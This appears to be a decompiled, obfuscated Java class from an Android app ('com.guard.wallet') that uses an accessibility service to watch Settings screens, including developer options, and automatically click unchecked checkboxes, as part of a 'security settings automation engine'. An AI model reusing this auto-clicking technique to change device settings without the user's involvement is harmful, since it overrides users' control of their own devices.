package o;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.HashSet;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.locks.ReentrantLock;

public final class k extends e {
   public final ScheduledExecutorService n;
   public final ConcurrentLinkedQueue o;
   public boolean p;
   public boolean q;
   public boolean r;
   public final ReentrantLock s;
   public final AtomicBoolean t;

   public k() {
      super(J(), "com.android.settings");
      ScheduledExecutorService var2 = Executors.newSingleThreadScheduledExecutor();
      this.n = var2;
      this.o = new ConcurrentLinkedQueue();
      this.p = false;
      this.q = false;
      this.r = false;
      this.s = new ReentrantLock();
      this.t = new AtomicBoolean(false);

      try {
         e.a var1 = new e.a(this, 2);
         var2.schedule(var1, 100L, TimeUnit.SECONDS);
      } catch (Exception var3) {
         a1.q.s("EnableSecureDelegate", var3);
      }
   }

   public static LinkedList J() {
      LinkedList var1 = new LinkedList();
      ListenWindow var3 = new ListenWindow("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsDashboardActivity");
      HashSet var2 = o.b.r(var3);
      Integer var0 = 32;
      var2.add(var0);
      HashSet var4 = var3.getEventTypes();
      Integer var5 = 16384;
      var4.add(var5);
      var1.add(var3);
      var3 = new ListenWindow("com.android.settings", "com.android.settings.Settings$DevelopmentSettingsActivity");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var0);
      var3.getEventTypes().add(var5);
      var1.add(var3);
      var1.add(a0.s0());
      var1.add(a0.p0());
      var1.add(a0.o0());
      var3 = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
      var3.setEventTypes(new HashSet<>());
      var3.getEventTypes().add(var0);
      var3.getEventTypes().add(var5);
      var1.add(var3);
      var1.add(a0.M0());
      var1.add(a0.I0());
      return var1;
   }

   public final boolean H() {
      LinkedList var1 = new LinkedList();
      var1.add(a0.M0());
      return this.q(var1);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void I(boolean var1) {
      ReentrantLock var2 = this.s;
      if (var2.tryLock()) {
         AtomicBoolean var3 = this.t;

         label59: {
            Exception var10000;
            label66: {
               try {
                  if (var3.get()) {
                     break label59;
                  }

                  Log.d("EnableSecureDelegate", "准备结束安全设置自动化引擎");
                  var3.set(true);
                  this.n.shutdownNow();
                  com.guard.wallet.thread.l.a(super.c);
                  this.o.clear();
               } catch (Exception var9) {
                  var10000 = var9;
                  boolean var10001 = false;
                  break label66;
               }

               try {
                  com.guard.wallet.utils.g.F0(1);
                  com.guard.wallet.utils.g.T0(5);
               } catch (Exception var8) {
                  Exception var10 = var8;

                  try {
                     a1.q.s("EnableSecureDelegate", var10);
                  } catch (Exception var7) {
                     var10000 = var7;
                     boolean var12 = false;
                     break label66;
                  }
               }

               label48: {
                  try {
                     if (h.e.S() != null) {
                        Log.d("EnableSecureDelegate", "enableInFinish finishOpenWriteSecure");
                        h.e.S().R(var1);
                        break label48;
                     }
                  } catch (Exception var6) {
                     var10000 = var6;
                     boolean var13 = false;
                     break label66;
                  }

                  try {
                     if (MyAccessibilityService.P() != null) {
                        Log.d("EnableSecureDelegate", "enableInFinish removeEnableSecureDelegate");
                        MyAccessibilityService.P().v();
                     }
                  } catch (Exception var5) {
                     var10000 = var5;
                     boolean var14 = false;
                     break label66;
                  }
               }

               try {
                  com.guard.wallet.helper.g.c();
                  Log.d("EnableSecureDelegate", "已结束安全设置自动化引擎");
                  super.d();
                  break label59;
               } catch (Exception var4) {
                  var10000 = var4;
                  boolean var15 = false;
               }
            }

            Exception var11 = var10000;
            a1.q.s("EnableSecureDelegate", var11);
         }

         var2.unlock();
      }
   }

   public final CheckedResult K(UiObject var1, int var2) {
      boolean var3 = false;
      AtomicInteger var7 = new AtomicInteger(0);
      CheckedResult var8 = new CheckedResult();
      CombineFilter var6 = new CombineFilter();
      StringCondition var5 = a.a.c(var6, "className", "android.widget.CheckBox");
      var6.getStringConditions().add(var5);
      MyAccessibilityService.I(var1);

      for (var9 = null; var1 != null && var9 == null && var7.incrementAndGet() <= 3; var1 = var1.parent()) {
         var9 = var1.findOneByCombine(var6);
      }

      if (var9 != null) {
         boolean var4 = var9.checked();
         var3 = var4;
         if (!var4) {
            var9.click();
            var8.setClicked(true);
            var3 = var4;
            if (var2 > 0) {
               com.guard.wallet.utils.g.T0(var2);
               var9.refresh();
               var3 = var9.checked();
            }
         }
      }

      var8.setChecked(var3);
      return var8;
   }

   public final UiObject L() {
      CombineFiltersWithOr var1 = a0.H0();
      UiObject var2;
      if (this.k() != null) {
         var2 = this.k().findOneByOperateOr(var1);
      } else {
         var2 = null;
      }

      return var2;
   }

   @Override
   public final void d() {
      try {
         this.n.shutdownNow();
         com.guard.wallet.thread.l.a(super.c);
         this.o.clear();
         super.d();
      } catch (Exception var2) {
         a1.q.s("EnableSecureDelegate", var2);
      }
   }

   @Override
   public final boolean equals(Object var1) {
      return var1 instanceof k;
   }

   @Override
   public final int hashCode() {
      return Objects.hash(k.class.getName());
   }

   @Override
   public final void u(AccessibilityEvent var1, String var2, String var3) {
      if (!this.t.get()) {
         if (var1 != null) {
            super.u(var1, var2, var3);
         }

         LinkedList var5 = new LinkedList();
         var5.add(a0.Y());
         var5.add(a0.W());
         var5.add(a0.s0());
         var5.add(a0.P0());
         var5.add(a0.O0());
         var5.add(a0.p0());
         var5.add(a0.o0());
         boolean var4 = this.q(var5);
         var2 = super.c;
         ConcurrentLinkedQueue var6 = this.o;
         if (var4 && !var6.contains("enableInPrepareFinish")) {
            var6.add("enableInPrepareFinish");
            com.guard.wallet.thread.l.c(new j(this, 0), var2);
         }

         if (this.H() && !var6.contains("enableInSecurityCenter")) {
            var6.add("enableInSecurityCenter");
            com.guard.wallet.thread.l.c(new j(this, 1), var2);
         }
      }
   }
}
